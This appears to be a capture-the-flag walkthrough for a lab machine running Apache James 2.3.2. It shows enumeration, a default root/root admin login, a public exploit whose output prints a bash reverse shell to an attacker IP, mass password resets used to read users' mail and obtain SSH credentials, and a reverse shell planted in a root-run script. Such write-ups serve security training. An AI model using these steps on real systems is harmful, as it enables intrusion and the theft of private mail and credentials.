---
sort : 2
--- 

# Solid State

## Basic Information

users typically use a program that uses `SMTP` for sending e-mail and either `POP3` or `IMAP` for receiving e-mail. On Unix-based systems, sendmail is the most widely-used SMTP server for e-mail. A commercial package, Sendmail, includes a POP3 server. Microsoft Exchange includes an SMTP server and can also be set up to include POP3 support.

## Enum

```
PORT        STATE   SERVICE
22/tcp      open    ssh
25/tcp      open    smtp
80/tcp      open    http
110/tcp     open    pop3
119/tcp     open    nntp
4555/tcp    open    rsip                #=======> any unknown port try to telent into it 
```

on the website we found
webadmin@solid-state-security.com


```bash
# give it few seconds !! 
$ telnet 10.129.29.189 4555
# Trying 10.129.29.189...
# Connected to 10.129.29.189.
# Escape character is '^]'.
# JAMES Remote Administration Tool 2.3.2   # ========> nice !! 
# Please enter your login and password
# Login id:
```

```bash
$ searchsploit James
# ----------------------------------------------------------------------------------- ---------------------------------
#  Exploit Title                                                                     |  Path
# ----------------------------------------------------------------------------------- ---------------------------------
# Apache James Server 2.2 - SMTP Denial of Service                                   | multiple/dos/27915.pl
# Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploi | linux/remote/48130.rb
# Apache James Server 2.3.2 - Remote Command Execution                               | linux/remote/35513.py
# Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)     | linux/remote/50347.py
# WheresJames Webcam Publisher Beta 2.0.0014 - Remote Buffer Overflow                | windows/remote/944.c
# ----------------------------------------------------------------------------------- ---------------------------------

$ cp /usr/share/exploitdb/exploits/linux/remote/50347.py .

$ python3 50347.py 10.129.29.189 10.10.16.7 1234 
# [+]Payload Selected (see script for more options):  /bin/bash -i >& /dev/tcp/10.10.16.7/1234 0>&1
# [+]Example netcat listener syntax to use after successful execution: nc -lvnp 1234
# [+]Connecting to James Remote Administration Tool...
# [+]Creating user...
# [+]Connecting to James SMTP server...
# [+]Sending payload...
# [+]Done! Payload will be executed once somebody logs in (i.e. via SSH).  <=========== it has to be !!  
# [+]Don't forget to start a listener on port 1234 before logging in!

```
searching for around the exploit... we found that the default login id = **root**, and the password = **root**

```bash
listusers
# Existing accounts 6
# user: james
# user: ../../../../../../../../etc/bash_completion.d          =====> created by the exploit.py
# user: thomas
# user: john
# user: mindy
# user: mailadmin

setpassword james test123
# Password for james reset
setpassword thomas test123
# Password for thomas reset
setpassword john test123
# Password for john reset
setpassword mindy test123
# Password for mindy reset
setpassword mailadmin test123
# Password for mailadmin reset
```

connecting to pop3 

```bash
telnet 10.129.29.189 110 
# Trying 10.129.29.189...
# Connected to 10.129.29.189.
# Escape character is '^]'.
# +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER james
# +OK
PASS test123
# +OK Welcome james
LIST
# +OK 0 0               ====> no emails for the user james

USER thomas 
# +OK
PASS test123
# +OK Welcome thomas
LIST
# +OK 0 0               =====> nothing again 

USER john 
# +OK
PASS test123
# +OK Welcome john
LIST
# +OK 1 743
# 1 743                 ======> OK ?? 

RETR 1
# +OK Message follows
# Return-Path: <mailadmin@localhost>
# Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
# MIME-Version: 1.0
# Content-Type: text/plain; charset=us-ascii
# Content-Transfer-Encoding: 7bit
# Delivered-To: john@localhost
# Received: from 192.168.11.142 ([192.168.11.142])
#           by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
#           for <john@localhost>;
#           Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
# Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
# From: mailadmin@localhost
# Subject: New Hires access
# John, 

# Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

# Thank you in advance.

# Respectfully,
# James

USER mindy
# +OK
PASS test123
# +OK Welcome mindy
LIST
# +OK 2 1945
# 1 1109
# 2 836

RETR 1
# +OK Message follows
# Return-Path: <mailadmin@localhost>
# Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
# MIME-Version: 1.0
# Content-Type: text/plain; charset=us-ascii
# Content-Transfer-Encoding: 7bit
# Delivered-To: mindy@localhost
# Received: from 192.168.11.142 ([192.168.11.142])
#           by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
#           for <mindy@localhost>;
#           Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
# Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
# From: mailadmin@localhost
# Subject: Welcome

# Dear Mindy,
# Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

# We are looking forward to you joining our team and your success at Solid State Security. 

# Respectfully,
# James

RETR 2
# +OK Message follows
# Return-Path: <mailadmin@localhost>
# Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
# MIME-Version: 1.0
# Content-Type: text/plain; charset=us-ascii
# Content-Transfer-Encoding: 7bit
# Delivered-To: mindy@localhost
# Received: from 192.168.11.142 ([192.168.11.142])
#           by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
#           for <mindy@localhost>;
#           Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
# Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
# From: mailadmin@localhost
# Subject: Your Access

# Dear Mindy,


# Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
# Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

# username: mindy
# pass: P@55W0rd1!2@

# Respectfully,
# James

USER mailadmin
# +OK
PASS test123
# +OK Welcome mailadmin
LIST
# +OK 0 0
```

## PrevEsc

```bash
$ pspy64 

# you will find a script running by root perodically but it's writable by me
$ nano /opt/tmp.py
# reverse shell to be executed !! 
# Good Luck ^^ 
```